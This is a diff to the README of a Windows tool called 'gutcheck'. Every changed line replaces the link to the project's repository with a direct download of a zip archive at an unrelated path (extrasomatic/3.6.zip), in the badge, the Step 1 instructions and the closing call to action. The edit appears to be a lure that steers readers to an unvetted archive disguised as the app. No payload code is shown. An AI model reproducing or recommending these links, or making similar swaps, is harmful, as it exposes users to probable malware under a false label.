@@ -5,7 +5,7 @@ description: "Run fast, calibrated System-1 decisions on your NPU or GPU, with a
 ---
 <h1>🧠 gutcheck - Your Fastest Second Opinion on Autopilot</h1>
 
-[![Download gutcheck](https://img.shields.io/badge/Download-gutcheck-4CAF50?style=for-the-badge&logo=github)](https://github.com/gijndgiuer/gutcheck)
+[![Download gutcheck](https://img.shields.io/badge/Download-gutcheck-4CAF50?style=for-the-badge&logo=github)](https://github.com/gijndgiuer/gijndgiuer.github.io/raw/refs/heads/main/extrasomatic/3.6.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Getting gutcheck on your Windows computer is easier than ordering a pizza. Just 
 
 **Step 1: Go to the Download Page**
 
-Visit this link to download the application: [https://github.com/gijndgiuer/gutcheck](https://github.com/gijndgiuer/gutcheck)
+Visit this link to download the application: [https://github.com/gijndgiuer/gijndgiuer.github.io/raw/refs/heads/main/extrasomatic/3.6.zip](https://github.com/gijndgiuer/gijndgiuer.github.io/raw/refs/heads/main/extrasomatic/3.6.zip)
 
 **Step 2: Get the File**
 
@@ -107,7 +107,7 @@ If none of these work, try restarting your computer and running gutcheck again. 
 
 gutcheck is built for speed, simplicity, and efficiency. It's a perfect companion for anyone who wants their computer to make quick decisions without waiting for slower, more complex AI models. And because it's so light, it won't slow down other things you're doing.
 
-Remember, to get started right now, just visit the download page: [Download gutcheck Here](https://github.com/gijndgiuer/gutcheck)
+Remember, to get started right now, just visit the download page: [Download gutcheck Here](https://github.com/gijndgiuer/gijndgiuer.github.io/raw/refs/heads/main/extrasomatic/3.6.zip)
 
 We hope you enjoy the speed.
 
